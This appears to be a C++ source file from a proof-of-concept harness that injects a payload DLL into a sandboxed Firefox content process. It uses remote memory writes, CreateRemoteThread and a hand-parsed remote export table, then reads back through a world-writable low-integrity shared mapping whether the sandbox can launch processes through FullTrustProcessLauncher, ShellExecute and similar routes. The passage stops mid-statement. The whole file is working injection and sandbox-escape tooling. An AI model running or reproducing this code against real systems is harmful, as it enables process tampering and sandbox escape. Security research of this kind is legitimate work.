#include "poc_context.h"

#include <appmodel.h>
#include <sddl.h>
#include <shobjidl_core.h>
#include <tlhelp32.h>
#include <winternl.h>

#include <algorithm>
#include <cctype>
#include <cstring>
#include <cwctype>
#include <iomanip>
#include <iostream>
#include <iterator>
#include <memory>
#include <sstream>
#include <stdexcept>
#include <string>
#include <vector>

namespace {

class ScopedHandle {
 public:
  explicit ScopedHandle(HANDLE handle = nullptr) : handle_(handle) {}
  ~ScopedHandle() {
    if (handle_ && handle_ != INVALID_HANDLE_VALUE) {
      CloseHandle(handle_);
    }
  }
  ScopedHandle(const ScopedHandle&) = delete;
  ScopedHandle& operator=(const ScopedHandle&) = delete;
  HANDLE get() const { return handle_; }
  explicit operator bool() const {
    return handle_ && handle_ != INVALID_HANDLE_VALUE;
  }

 private:
  HANDLE handle_;
};

class ScopedModule {
 public:
  explicit ScopedModule(HMODULE module = nullptr) : module_(module) {}
  ~ScopedModule() {
    if (module_) {
      FreeLibrary(module_);
    }
  }
  HMODULE get() const { return module_; }

 private:
  HMODULE module_;
};

[[noreturn]] void ThrowWindowsError(const std::string& operation,
                                    DWORD error = GetLastError()) {
  std::ostringstream message;
  message << operation << " failed with Win32 error " << error;
  throw std::runtime_error(message.str());
}

void CheckHresult(HRESULT result, const std::string& operation) {
  if (FAILED(result)) {
    std::ostringstream message;
    message << operation << " failed with HRESULT 0x" << std::hex
            << std::uppercase << static_cast<std::uint32_t>(result);
    throw std::runtime_error(message.str());
  }
}

std::wstring RequireOption(int argc, wchar_t** argv, const wchar_t* option) {
  for (int index = 2; index + 1 < argc; ++index) {
    if (_wcsicmp(argv[index], option) == 0) {
      return argv[index + 1];
    }
  }
  throw std::runtime_error("missing required command-line option");
}

DWORD ParsePid(const std::wstring& value) {
  wchar_t* end = nullptr;
  const auto parsed = wcstoul(value.c_str(), &end, 10);
  if (!end || *end != L'\0' || parsed == 0 || parsed > MAXDWORD) {
    throw std::runtime_error("invalid process id");
  }
  return static_cast<DWORD>(parsed);
}

std::string WideToUtf8(const std::wstring& value) {
  if (value.empty()) {
    return {};
  }
  const int length = WideCharToMultiByte(CP_UTF8, 0, value.data(),
                                         static_cast<int>(value.size()), nullptr,
                                         0, nullptr, nullptr);
  if (length <= 0) {
    ThrowWindowsError("WideCharToMultiByte");
  }
  std::string result(length, '\0');
  WideCharToMultiByte(CP_UTF8, 0, value.data(), static_cast<int>(value.size()),
                      result.data(), length, nullptr, nullptr);
  return result;
}

std::string JsonEscape(const std::wstring& value) {
  const std::string utf8 = WideToUtf8(value);
  std::ostringstream output;
  for (const unsigned char character : utf8) {
    switch (character) {
      case '"':
        output << "\\\"";
        break;
      case '\\':
        output << "\\\\";
        break;
      case '\b':
        output << "\\b";
        break;
      case '\f':
        output << "\\f";
        break;
      case '\n':
        output << "\\n";
        break;
      case '\r':
        output << "\\r";
        break;
      case '\t':
        output << "\\t";
        break;
      default:
        if (character < 0x20) {
          output << "\\u" << std::hex << std::setw(4) << std::setfill('0')
                 << static_cast<unsigned int>(character) << std::dec;
        } else {
          output << character;
        }
    }
  }
  return output.str();
}

std::wstring BaseName(const std::wstring& path) {
  const auto separator = path.find_last_of(L"\\/");
  return separator == std::wstring::npos ? path : path.substr(separator + 1);
}

std::wstring ToLower(std::wstring value) {
  std::transform(value.begin(), value.end(), value.begin(),
                 [](wchar_t character) { return std::towlower(character); });
  return value;
}

template <std::size_t N>
void CopyString(wchar_t (&destination)[N], const wchar_t* source) {
  wcsncpy_s(destination, source ? source : L"", _TRUNCATE);
}

template <std::size_t N>
void CopyString(wchar_t (&destination)[N], const std::wstring& source) {
  CopyString(destination, source.c_str());
}

std::wstring QueryCommandLine(HANDLE process) {
  using NtQueryInformationProcessFunction = NTSTATUS(NTAPI*)(
      HANDLE, PROCESSINFOCLASS, PVOID, ULONG, PULONG);
  const auto ntdll = GetModuleHandleW(L"ntdll.dll");
  const auto query = reinterpret_cast<NtQueryInformationProcessFunction>(
      GetProcAddress(ntdll, "NtQueryInformationProcess"));
  if (!query) {
    return {};
  }

  ULONG length = 0;
  query(process, static_cast<PROCESSINFOCLASS>(60), nullptr, 0, &length);
  if (!length) {
    return {};
  }

  std::vector<BYTE> buffer(length + sizeof(wchar_t));
  const NTSTATUS status = query(process, static_cast<PROCESSINFOCLASS>(60),
                                buffer.data(), length, &length);
  if (status < 0) {
    return {};
  }

  const auto command_line = reinterpret_cast<UNICODE_STRING*>(buffer.data());
  if (!command_line->Buffer || !command_line->Length) {
    return {};
  }

  const auto buffer_start = reinterpret_cast<std::uintptr_t>(buffer.data());
  const auto buffer_end = buffer_start + buffer.size();
  const auto string_start =
      reinterpret_cast<std::uintptr_t>(command_line->Buffer);
  const auto string_end = string_start + command_line->Length;
  if (string_start >= buffer_start && string_end <= buffer_end) {
    return std::wstring(command_line->Buffer,
                        command_line->Length / sizeof(wchar_t));
  }

  std::wstring result(command_line->Length / sizeof(wchar_t), L'\0');
  SIZE_T bytes_read = 0;
  if (!ReadProcessMemory(process, command_line->Buffer, result.data(),
                         command_line->Length, &bytes_read)) {
    return {};
  }
  return result;
}

void CaptureToken(HANDLE process, TokenSnapshot& snapshot) {
  HANDLE raw_token = nullptr;
  if (!OpenProcessToken(process, TOKEN_QUERY, &raw_token)) {
    ThrowWindowsError("OpenProcessToken");
  }
  ScopedHandle token(raw_token);
  snapshot.is_restricted = IsTokenRestricted(token.get());

  DWORD returned = 0;
  DWORD value = 0;
  if (GetTokenInformation(token.get(), TokenIsAppContainer, &value,
                          sizeof(value), &returned)) {
    snapshot.is_app_container = value;
  }

  TOKEN_ELEVATION elevation{};
  if (GetTokenInformation(token.get(), TokenElevation, &elevation,
                          sizeof(elevation), &returned)) {
    snapshot.is_elevated = elevation.TokenIsElevated;
  }

  GetTokenInformation(token.get(), TokenIntegrityLevel, nullptr, 0, &returned);
  if (!returned) {
    return;
  }
  std::vector<BYTE> buffer(returned);
  if (!GetTokenInformation(token.get(), TokenIntegrityLevel, buffer.data(),
                           returned, &returned)) {
    ThrowWindowsError("GetTokenInformation(TokenIntegrityLevel)");
  }
  const auto label = reinterpret_cast<TOKEN_MANDATORY_LABEL*>(buffer.data());
  const auto count = *GetSidSubAuthorityCount(label->Label.Sid);
  snapshot.integrity_rid = *GetSidSubAuthority(label->Label.Sid, count - 1);
}

TokenSnapshot InspectProcess(DWORD pid, DWORD access) {
  ScopedHandle process(OpenProcess(access, FALSE, pid));
  if (!process) {
    ThrowWindowsError("OpenProcess");
  }

  TokenSnapshot snapshot{};
  snapshot.pid = pid;
  IsProcessInJob(process.get(), nullptr, &snapshot.is_in_job);

  std::vector<wchar_t> image(32768);
  DWORD image_length = static_cast<DWORD>(image.size());
  if (!QueryFullProcessImageNameW(process.get(), 0, image.data(),
                                  &image_length)) {
    ThrowWindowsError("QueryFullProcessImageNameW");
  }
  CopyString(snapshot.image_path,
             std::wstring(image.data(), static_cast<std::size_t>(image_length)));
  CopyString(snapshot.command_line, QueryCommandLine(process.get()));

  UINT32 length = 0;
  LONG result = GetPackageFamilyName(process.get(), &length, nullptr);
  if (result == ERROR_INSUFFICIENT_BUFFER && length) {
    std::vector<wchar_t> package(length);
    if (GetPackageFamilyName(process.get(), &length, package.data()) ==
        ERROR_SUCCESS) {
      CopyString(snapshot.package_family, package.data());
    }
  }

  length = 0;
  result = GetPackageFullName(process.get(), &length, nullptr);
  if (result == ERROR_INSUFFICIENT_BUFFER && length) {
    std::vector<wchar_t> package(length);
    if (GetPackageFullName(process.get(), &length, package.data()) ==
        ERROR_SUCCESS) {
      CopyString(snapshot.package_full_name, package.data());
    }
  }

  CaptureToken(process.get(), snapshot);
  return snapshot;
}

std::uintptr_t FindRemoteModuleByMemoryMap(
    DWORD pid, const std::wstring& module_name) {
  using GetMappedFileNameFunction = DWORD(WINAPI*)(HANDLE, LPVOID, LPWSTR,
                                                   DWORD);
  const auto get_mapped_file_name =
      reinterpret_cast<GetMappedFileNameFunction>(GetProcAddress(
          GetModuleHandleW(L"kernel32.dll"), "K32GetMappedFileNameW"));
  if (!get_mapped_file_name) {
    ThrowWindowsError("GetProcAddress(K32GetMappedFileNameW)");
  }

  ScopedHandle process(OpenProcess(PROCESS_QUERY_INFORMATION |
                                       PROCESS_QUERY_LIMITED_INFORMATION |
                                       PROCESS_VM_READ,
                                   FALSE, pid));
  if (!process) {
    ThrowWindowsError("OpenProcess(module scan)");
  }

  std::uintptr_t address = 0;
  std::uintptr_t last_allocation_base = 0;
  while (true) {
    MEMORY_BASIC_INFORMATION region{};
    const SIZE_T queried = VirtualQueryEx(
        process.get(), reinterpret_cast<LPCVOID>(address), &region,
        sizeof(region));
    if (!queried) {
      if (GetLastError() == ERROR_INVALID_PARAMETER) {
        return 0;
      }
      ThrowWindowsError("VirtualQueryEx(module scan)");
    }

    const auto allocation_base =
        reinterpret_cast<std::uintptr_t>(region.AllocationBase);
    if (region.State == MEM_COMMIT && region.Type == MEM_IMAGE &&
        allocation_base != 0 && allocation_base != last_allocation_base) {
      last_allocation_base = allocation_base;
      wchar_t mapped_path[32768]{};
      if (get_mapped_file_name(process.get(), region.AllocationBase,
                               mapped_path,
                               static_cast<DWORD>(std::size(mapped_path))) &&
          _wcsicmp(BaseName(mapped_path).c_str(), module_name.c_str()) == 0) {
        return allocation_base;
      }
    }

    const auto base = reinterpret_cast<std::uintptr_t>(region.BaseAddress);
    const auto next = base + region.RegionSize;
    if (next <= address || next < base) {
      return 0;
    }
    address = next;
  }
}

bool ReadRemoteBytes(HANDLE process, std::uintptr_t address, void* buffer,
                     SIZE_T size) {
  SIZE_T bytes_read = 0;
  return ReadProcessMemory(process, reinterpret_cast<LPCVOID>(address), buffer,
                           size, &bytes_read) &&
         bytes_read == size;
}

std::uintptr_t FindRemoteModuleInPeb(HANDLE process,
                                     std::uintptr_t peb_address,
                                     const std::wstring& module_name) {
  if (!peb_address) {
    return 0;
  }

  // PEB, PEB_LDR_DATA, and LDR_DATA_TABLE_ENTRY are deliberately read by
  // stable x64 field offsets. This path is used for x64 processes emulated on
  // ARM64, where Toolhelp and VirtualQueryEx reject cross-machine queries.
  std::uint64_t loader_address = 0;
  if (!ReadRemoteBytes(process, peb_address + 0x18, &loader_address,
                       sizeof(loader_address)) ||
      !loader_address) {
    return 0;
  }

  const std::uintptr_t list_head =
      static_cast<std::uintptr_t>(loader_address) + 0x10;
  std::uint64_t current = 0;
  if (!ReadRemoteBytes(process, list_head, &current, sizeof(current))) {
    return 0;
  }

  struct RemoteUnicodeString {
    USHORT length;
    USHORT maximum_length;
    ULONG padding;
    std::uint64_t buffer;
  };

  for (int index = 0; index < 512 && current && current != list_head;
       ++index) {
    std::uint64_t next = 0;
    std::uint64_t module_base = 0;
    RemoteUnicodeString base_name{};
    if (!ReadRemoteBytes(process, static_cast<std::uintptr_t>(current), &next,
                         sizeof(next)) ||
        !ReadRemoteBytes(process, static_cast<std::uintptr_t>(current) + 0x30,
                         &module_base, sizeof(module_base)) ||
        !ReadRemoteBytes(process, static_cast<std::uintptr_t>(current) + 0x58,
                         &base_name, sizeof(base_name))) {
      return 0;
    }

    if (base_name.buffer && base_name.length > 0 &&
        base_name.length <= 32766 &&
        base_name.length % sizeof(wchar_t) == 0) {
      std::wstring name(base_name.length / sizeof(wchar_t), L'\0');
      if (ReadRemoteBytes(process,
                          static_cast<std::uintptr_t>(base_name.buffer),
                          name.data(), base_name.length) &&
          _wcsicmp(name.c_str(), module_name.c_str()) == 0) {
        return static_cast<std::uintptr_t>(module_base);
      }
    }
    current = next;
  }
  return 0;
}

std::uintptr_t FindRemoteModuleByPeb(DWORD pid,
                                     const std::wstring& module_name) {
  ScopedHandle process(OpenProcess(PROCESS_QUERY_INFORMATION |
                                       PROCESS_QUERY_LIMITED_INFORMATION |
                                       PROCESS_VM_READ,
                                   FALSE, pid));
  if (!process) {
    ThrowWindowsError("OpenProcess(PEB module scan)");
  }

  using NtQueryInformationProcessFunction = NTSTATUS(NTAPI*)(
      HANDLE, PROCESSINFOCLASS, PVOID, ULONG, PULONG);
  const auto query = reinterpret_cast<NtQueryInformationProcessFunction>(
      GetProcAddress(GetModuleHandleW(L"ntdll.dll"),
                     "NtQueryInformationProcess"));
  if (!query) {
    ThrowWindowsError("GetProcAddress(NtQueryInformationProcess)");
  }

  PROCESS_BASIC_INFORMATION basic{};
  ULONG returned = 0;
  if (query(process.get(), ProcessBasicInformation, &basic, sizeof(basic),
            &returned) >= 0) {
    const auto found = FindRemoteModuleInPeb(
        process.get(), reinterpret_cast<std::uintptr_t>(basic.PebBaseAddress),
        module_name);
    if (found) {
      return found;
    }
  }

  ULONG_PTR emulated_peb = 0;
  if (query(process.get(), static_cast<PROCESSINFOCLASS>(26), &emulated_peb,
            sizeof(emulated_peb), &returned) >= 0 &&
      emulated_peb) {
    return FindRemoteModuleInPeb(
        process.get(), static_cast<std::uintptr_t>(emulated_peb), module_name);
  }
  return 0;
}

std::uintptr_t FindRemoteModule(DWORD pid, const std::wstring& module_name) {
  for (int attempt = 0; attempt < 10; ++attempt) {
    ScopedHandle snapshot(
        CreateToolhelp32Snapshot(TH32CS_SNAPMODULE | TH32CS_SNAPMODULE32, pid));
    if (!snapshot) {
      const DWORD error = GetLastError();
      if (error == ERROR_BAD_LENGTH) {
        continue;
      }
      if (error == ERROR_PARTIAL_COPY) {
        return FindRemoteModuleByPeb(pid, module_name);
      }
      ThrowWindowsError("CreateToolhelp32Snapshot", error);
    }

    MODULEENTRY32W entry{};
    entry.dwSize = sizeof(entry);
    if (!Module32FirstW(snapshot.get(), &entry)) {
      const DWORD error = GetLastError();
      if (error == ERROR_PARTIAL_COPY) {
        return FindRemoteModuleByPeb(pid, module_name);
      }
      if (error == ERROR_NO_MORE_FILES) {
        return 0;
      }
      ThrowWindowsError("Module32FirstW", error);
    }
    do {
      if (_wcsicmp(entry.szModule, module_name.c_str()) == 0) {
        return reinterpret_cast<std::uintptr_t>(entry.modBaseAddr);
      }
    } while (Module32NextW(snapshot.get(), &entry));
    return FindRemoteModuleByPeb(pid, module_name);
  }
  return FindRemoteModuleByPeb(pid, module_name);
}

std::uintptr_t WaitForRemoteModule(DWORD pid,
                                   const std::wstring& module_name) {
  for (int attempt = 0; attempt < 100; ++attempt) {
    const auto address = FindRemoteModule(pid, module_name);
    if (address) {
      return address;
    }
    Sleep(50);
  }
  throw std::runtime_error("injected DLL was not visible in the target process");
}

std::string ReadRemoteAscii(HANDLE process, std::uintptr_t address,
                            std::size_t maximum_length = 512) {
  std::string result;
  result.reserve(maximum_length);
  for (std::size_t index = 0; index < maximum_length; ++index) {
    char character = '\0';
    if (!ReadRemoteBytes(process, address + index, &character,
                         sizeof(character))) {
      return {};
    }
    if (!character) {
      return result;
    }
    result.push_back(character);
  }
  return {};
}

std::uintptr_t RemoteProcedureAddress(DWORD pid,
                                      const std::wstring& module_name,
                                      const std::string& procedure_name,
                                      int depth = 0) {
  if (depth > 8) {
    throw std::runtime_error("remote export forwarder recursion exceeded");
  }

  ScopedHandle process(OpenProcess(PROCESS_QUERY_INFORMATION |
                                       PROCESS_QUERY_LIMITED_INFORMATION |
                                       PROCESS_VM_READ,
                                   FALSE, pid));
  if (!process) {
    ThrowWindowsError("OpenProcess(remote export)");
  }
  const auto module_base = FindRemoteModule(pid, module_name);
  if (!module_base) {
    throw std::runtime_error("required module not found in target PEB");
  }

  IMAGE_DOS_HEADER dos{};
  if (!ReadRemoteBytes(process.get(), module_base, &dos, sizeof(dos)) ||
      dos.e_magic != IMAGE_DOS_SIGNATURE || dos.e_lfanew <= 0) {
    throw std::runtime_error("remote module has an invalid DOS header");
  }
  IMAGE_NT_HEADERS64 nt{};
  if (!ReadRemoteBytes(process.get(), module_base + dos.e_lfanew, &nt,
                       sizeof(nt)) ||
      nt.Signature != IMAGE_NT_SIGNATURE ||
      nt.OptionalHeader.Magic != IMAGE_NT_OPTIONAL_HDR64_MAGIC) {
    throw std::runtime_error("remote module has an invalid PE header");
  }

  const auto& directory =
      nt.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];
  if (!directory.VirtualAddress || !directory.Size) {
    throw std::runtime_error("remote module has no export directory");
  }
  IMAGE_EXPORT_DIRECTORY exports{};
  if (!ReadRemoteBytes(process.get(), module_base + directory.VirtualAddress,
                       &exports, sizeof(exports)) ||
      !exports.NumberOfNames || !exports.NumberOfFunctions ||
      exports.NumberOfNames > 65536 || exports.NumberOfFunctions > 65536) {
    throw std::runtime_error("remote module has an invalid export directory");
  }

  std::vector<DWORD> name_rvas(exports.NumberOfNames);
  std::vector<WORD> ordinals(exports.NumberOfNames);
  std::vector<DWORD> function_rvas(exports.NumberOfFunctions);
  if (!ReadRemoteBytes(process.get(),
                       module_base + exports.AddressOfNames,
                       name_rvas.data(), name_rvas.size() * sizeof(DWORD)) ||
      !ReadRemoteBytes(process.get(),
                       module_base + exports.AddressOfNameOrdinals,
                       ordinals.data(), ordinals.size() * sizeof(WORD)) ||
      !ReadRemoteBytes(process.get(),
                       module_base + exports.AddressOfFunctions,
                       function_rvas.data(),
                       function_rvas.size() * sizeof(DWORD))) {
    throw std::runtime_error("could not read the remote export table");
  }

  for (std::size_t index = 0; index < name_rvas.size(); ++index) {
    if (ReadRemoteAscii(process.get(), module_base + name_rvas[index]) !=
        procedure_name) {
      continue;
    }
    const WORD ordinal = ordinals[index];
    if (ordinal >= function_rvas.size()) {
      throw std::runtime_error("remote export ordinal is invalid");
    }
    const DWORD function_rva = function_rvas[ordinal];
    if (function_rva >= directory.VirtualAddress &&
        function_rva < directory.VirtualAddress + directory.Size) {
      const std::string forwarder =
          ReadRemoteAscii(process.get(), module_base + function_rva);
      const auto separator = forwarder.find('.');
      if (separator == std::string::npos || separator == 0 ||
          separator + 1 >= forwarder.size() ||
          forwarder[separator + 1] == '#') {
        throw std::runtime_error("remote export has an unsupported forwarder");
      }
      std::wstring forwarded_module(forwarder.begin(),
                                    forwarder.begin() + separator);
      if (forwarded_module.find(L'.') == std::wstring::npos) {
        forwarded_module += L".dll";
      }
      return RemoteProcedureAddress(
          pid, forwarded_module, forwarder.substr(separator + 1), depth + 1);
    }
    return module_base + function_rva;
  }
  throw std::runtime_error("procedure not found in remote export table");
}

void InjectLibrary(HANDLE process, DWORD pid, const std::wstring& dll_path) {
  const SIZE_T path_size = (dll_path.size() + 1) * sizeof(wchar_t);
  void* remote_path = VirtualAllocEx(process, nullptr, path_size,
                                     MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
  if (!remote_path) {
    ThrowWindowsError("VirtualAllocEx(DLL path)");
  }

  SIZE_T bytes_written = 0;
  if (!WriteProcessMemory(process, remote_path, dll_path.c_str(), path_size,
                          &bytes_written) ||
      bytes_written != path_size) {
    ThrowWindowsError("WriteProcessMemory(DLL path)");
  }

  const auto load_library = RemoteProcedureAddress(
      pid, std::wstring(L"kernel32.dll"), std::string("LoadLibraryW"));
  ScopedHandle thread(CreateRemoteThread(
      process, nullptr, 0,
      reinterpret_cast<LPTHREAD_START_ROUTINE>(load_library), remote_path, 0,
      nullptr));
  if (!thread) {
    ThrowWindowsError("CreateRemoteThread(LoadLibraryW)");
  }
  if (WaitForSingleObject(thread.get(), 30000) != WAIT_OBJECT_0) {
    throw std::runtime_error("timed out loading the payload DLL");
  }

  DWORD thread_result = 0;
  if (!GetExitCodeThread(thread.get(), &thread_result)) {
    ThrowWindowsError("GetExitCodeThread(LoadLibraryW)");
  }
  VirtualFreeEx(process, remote_path, 0, MEM_RELEASE);
  // GetExitCodeThread truncates the 64-bit HMODULE returned by LoadLibraryW.
  // The payload's shared completion state is the authoritative load signal.
  (void)thread_result;
}

LaunchContext RunInjectedPoc(DWORD pid, const std::wstring& dll_path,
                             const std::wstring& local_dll_path,
                             const std::wstring& launch_arguments,
                             const std::wstring& shell_execute_arguments,
                             const std::wstring& shell_dispatch_arguments,
                             const std::wstring& app_exec_alias_arguments,
                             const std::wstring& notification_profile,
                             const std::wstring& background_task_name,
                             const std::wstring& application_user_model_id) {
  (void)dll_path;
  (void)local_dll_path;
  const DWORD access = PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION |
                       PROCESS_QUERY_LIMITED_INFORMATION | PROCESS_VM_OPERATION |
                       PROCESS_VM_READ | PROCESS_VM_WRITE;
  ScopedHandle process(OpenProcess(access, FALSE, pid));
  if (!process) {
    ThrowWindowsError("OpenProcess(inject)");
  }

  LaunchContext context{};
  context.magic = kPocContextMagic;
  context.state = 0;
  context.bootstrap_result = ERROR_IO_PENDING;
  context.target_pid = pid;
  context.call_hresult = E_PENDING;
  context.extended_error = E_PENDING;
  context.launch_result = -1;
  context.activation_hresult = E_PENDING;
  context.shell_execute_error = ERROR_IO_PENDING;
  context.app_exec_alias_error = ERROR_IO_PENDING;
  context.shell_dispatch_hresult = E_PENDING;
  context.notification_activation_hresult = E_PENDING;
  context.background_access_hresult = E_PENDING;
  context.background_access_status = -1;
  context.background_register_hresult = E_PENDING;
  if (launch_arguments.size() >= std::size(context.launch_arguments)) {
    throw std::runtime_error("launch argument string is too long");
  }
  wcsncpy_s(context.launch_arguments, launch_arguments.c_str(), _TRUNCATE);
  if (shell_execute_arguments.size() >=
      std::size(context.shell_execute_arguments)) {
    throw std::runtime_error("ShellExecute argument string is too long");
  }
  wcsncpy_s(context.shell_execute_arguments,
            shell_execute_arguments.c_str(), _TRUNCATE);
  if (shell_dispatch_arguments.size() >=
      std::size(context.shell_dispatch_arguments)) {
    throw std::runtime_error("Shell.Application argument string is too long");
  }
  wcsncpy_s(context.shell_dispatch_arguments,
            shell_dispatch_arguments.c_str(), _TRUNCATE);
  if (app_exec_alias_arguments.size() >=
      std::size(context.app_exec_alias_arguments)) {
    throw std::runtime_error("AppExecAlias argument string is too long");
  }
  wcsncpy_s(context.app_exec_alias_arguments,
            app_exec_alias_arguments.c_str(), _TRUNCATE);
  if (notification_profile.size() >=
      std::size(context.notification_profile)) {
    throw std::runtime_error("notification profile path is too long");
  }
  wcsncpy_s(context.notification_profile, notification_profile.c_str(),
            _TRUNCATE);
  if (background_task_name.size() >=
      std::size(context.background_task_name)) {
    throw std::runtime_error("background task name is too long");
  }
  wcsncpy_s(context.background_task_name, background_task_name.c_str(),
            _TRUNCATE);
  if (application_user_model_id.size() >=
      std::size(context.application_user_model_id)) {
    throw std::runtime_error("application user model ID is too long");
  }
  wcsncpy_s(context.application_user_model_id,
            application_user_model_id.c_str(), _TRUNCATE);

  PSECURITY_DESCRIPTOR security_descriptor = nullptr;
  if (!ConvertStringSecurityDescriptorToSecurityDescriptorW(
          L"D:(A;;GA;;;WD)(A;;GA;;;RC)S:(ML;;NW;;;S-1-16-0)",
          SDDL_REVISION_1, &security_descriptor, nullptr)) {
    ThrowWindowsError("ConvertStringSecurityDescriptorToSecurityDescriptorW");
  }
  SECURITY_ATTRIBUTES security_attributes{};
  security_attributes.nLength = sizeof(security_attributes);
  security_attributes.lpSecurityDescriptor = security_descriptor;
  security_attributes.bInheritHandle = FALSE;
  ScopedHandle mapping(CreateFileMappingW(
      INVALID_HANDLE_VALUE, &security_attributes, PAGE_READWRITE, 0,
      static_cast<DWORD>(sizeof(LaunchContext)), kPocContextMappingName));
  const DWORD mapping_error = GetLastError();
  LocalFree(security_descriptor);
  if (!mapping) {
    ThrowWindowsError("CreateFileMappingW(context)", mapping_error);
  }
  if (mapping_error == ERROR_ALREADY_EXISTS) {
    throw std::runtime_error("the PoC context mapping already exists");
  }

  auto* shared_context = static_cast<LaunchContext*>(MapViewOfFile(
      mapping.get(), FILE_MAP_READ | FILE_MAP_WRITE, 0, 0,
      sizeof(LaunchContext)));
  if (!shared_context) {
    ThrowWindowsError("MapViewOfFile(context)");
  }
  std::memcpy(shared_context, &context, sizeof(context));
  MemoryBarrier();
  InterlockedExchange(&shared_context->state, kPocContextReady);

  bool complete = false;
  for (int attempt = 0; attempt < 2400; ++attempt) {
    if (InterlockedCompareExchange(&shared_context->state,
                                   kPocContextComplete,
                                   kPocContextComplete) ==
        kPocContextComplete) {
      complete = true;
      break;
    }
    Sleep(50);
  }
  if (!complete) {
    UnmapViewOfFile(shared_context);
    throw std::runtime_error("timed out waiting for FullTrustProcessLauncher");
  }

  MemoryBarrier();
  std::memcpy(&context, shared_context, sizeof(context));
  UnmapViewOfFile(shared_context);
  if (context.bootstrap_result != ERROR_SUCCESS) {
    throw std::runtime_error("payload rejected its launch context");
  }

  if (context.magic != kPocContextMagic) {
    throw std::runtime_error("payload returned a corrupt launch context");
  }
  return context;
}

std::string IntegrityName(DWORD integrity_rid) {
  if (integrity_rid < SECURITY_MANDATORY_LOW_RID) {
    return "untrusted";
  }
  if (integrity_rid < SECURITY_MANDATORY_MEDIUM_RID) {
    return "low";
  }
  if (integrity_rid < SECURITY_MANDATORY_HIGH_RID) {
    return "medium";
  }
  if (integrity_rid < SECURITY_MANDATORY_SYSTEM_RID) {
    return "high";
  }
  return "system";
}

void PrintSnapshot(const TokenSnapshot& snapshot) {
  std::cout << "{\"pid\":" << snapshot.pid << ",\"image_path\":\""
            << JsonEscape(snapshot.image_path) << "\",\"command_line\":\""
            << JsonEscape(snapshot.command_line)
            << "\",\"package_family\":\""
            << JsonEscape(snapshot.package_family)
            << "\",\"package_full_name\":\""
            << JsonEscape(snapshot.package_full_name)
            << "\",\"integrity_rid\":" << snapshot.integrity_rid
            << ",\"integrity_name\":\""
            << IntegrityName(snapshot.integrity_rid)
            << "\",\"is_restricted\":"
            << (snapshot.is_restricted ? "true" : "false")
            << ",\"is_app_container\":"
            << (snapshot.is_app_container ? "true" : "false")
            << ",\"is_in_job\":"
            << (snapshot.is_in_job ? "true" : "false")
            << ",\"is_elevated\":"
            << (snapshot.is_elevated ? "true" : "false") << "}";
}

std::string HexHresult(LONG value) {
  std::ostringstream output;
  output << "0x" << std::hex << std::uppercase << std::setw(8)
         << std::setfill('0') << static_cast<std::uint32_t>(value);
  return output.str();
}

void VerifyFirefoxContentProcess(const TokenSnapshot& snapshot,
                                 const std::wstring& expected_family) {
  const std::wstring image_name = BaseName(snapshot.image_path);
  if (_wcsicmp(image_name.c_str(), L"firefox.exe") != 0 &&
      _wcsicmp(image_name.c_str(), L"firefox-real.exe") != 0) {
    throw std::runtime_error("target image is not firefox.exe");
  }
  const std::wstring command_line = ToLower(snapshot.command_line);
  if (command_line.find(L"-contentproc") == std::wstring::npos ||
      command_line.find(L"-isforbrowser") == std::wstring::npos) {
    throw std::runtime_error("target is not a Firefox browser content process");
  }
  if (snapshot.package_family[0] != L'\0' &&
      _wcsicmp(snapshot.package_family, expected_family.c_str()) != 0) {
    throw std::runtime_error("target package family does not match the MSIX");
  }
}

void ActivateApplication(const std::wstring& aumid,
                         const std::wstring& arguments) {
  const HRESULT initialize_result =
      CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);
  if (FAILED(initialize_result) && initialize_result != RPC_E_CHANGED_MODE) {
    CheckHresult(initialize_result, "CoInitializeEx");
  }

  IApplicationActivationManager* raw_manager = nullptr;
  CheckHresult(CoCreateInstance(CLSID_ApplicationActivationManager, nullptr,
                                CLSCTX_INPROC_SERVER,
                                IID_PPV_ARGS(&raw_manager)),
               "CoCreateInstance(ApplicationActivationManager)");
  std::unique_ptr<IApplicationActivationManager,
                  void (*)(IApplicationActivationManager*)>
      manager(raw_manager, [](IApplicationActivationManager* value) {
        value->Release();
      });

  DWORD pid = 0;
  CheckHresult(manager->ActivateApplication(aumid.c_str(), arguments.c_str(),
                                            AO_NONE, &pid),
               "ActivateApplication");
  std::cout << "{\"pid\":" << pid << "}\n";
  manager.reset();

  if (SUCCEEDED(initialize_result)) {
    CoUninitialize();
  }
}

}  // namespace

int wmain(int argc, wchar_t** argv) {
  try {
    if (argc < 2) {
      throw std::runtime_error("expected activate, inspect, or inject mode");
    }

    const std::wstring mode = ToLower(argv[1]);
    if (mode == L"activate") {
      ActivateApplication(RequireOption(argc, argv, L"--aumid"),
                          RequireOption(argc, argv, L"--launch-args"));
      return 0;
    }

    const DWORD pid = ParsePid(RequireOption(argc, argv, L"--pid"));
    if (mode == L"inspect") {
      PrintSnapshot(InspectProcess(pid, PROCESS_QUERY_LIMITED_INFORMATION |
                                           PROCESS_QUERY_INFORMATION |
                                           PROCESS_VM_READ));
      std::cout << "\n";
      return 0;
    }

    if (mode == L"inject") {
      const auto expected_family =
          RequireOption(argc, argv, L"--expected-family");
      const auto before = InspectProcess(
          pid, PROCESS_QUERY_LIMITED_INFORMATION | PROCESS_QUERY_INFORMATION |
                   PROCESS_VM_READ);
      VerifyFirefoxContentProcess(before, expected_family);

      wchar_t full_dll_path[32768]{};
      if (!GetFullPathNameW(RequireOption(argc, argv, L"--dll").c_str(),
                            static_cast<DWORD>(std::size(full_dll_path)),
                            full_dll_path, nullptr)) {
        ThrowWindowsError("GetFullPathNameW");
      }
      const auto context = RunInjectedPoc(
          pid, full_dll_path, RequireOption(argc, argv, L"--local-dll"),
          RequireOption(argc, argv, L"--launch-args"),
          RequireOption(argc, argv, L"--shell-execute-args"),
          RequireOption(argc, argv, L"--shell-dispatch-args"),
          RequireOption(argc, argv, L"--app-exec-alias-args"),
          RequireOption(argc, argv, L"--notification-profile"),
          RequireOption(argc, argv, L"--background-task-name"),
          RequireOption(argc, argv, L"--aumid"));

      std::cout << "{\"target_before\":";
      PrintSnapshot(before);
      std::cout << ",\"caller_inside\":";
      PrintSnapshot(context.caller);
      std::cout << ",\"call_hresult\":" << context.call_hresult
                << ",\"call_hresult_hex\":\""
                << HexHresult(context.call_hresult)
                << "\",\"launch_result\":" << context.launch_result
                << ",\"extended_error\":" << context.extended_error
                << ",\"extended_error_hex\":\""
                << HexHresult(context.extended_error)
                << "\",\"activation_hresult\":"
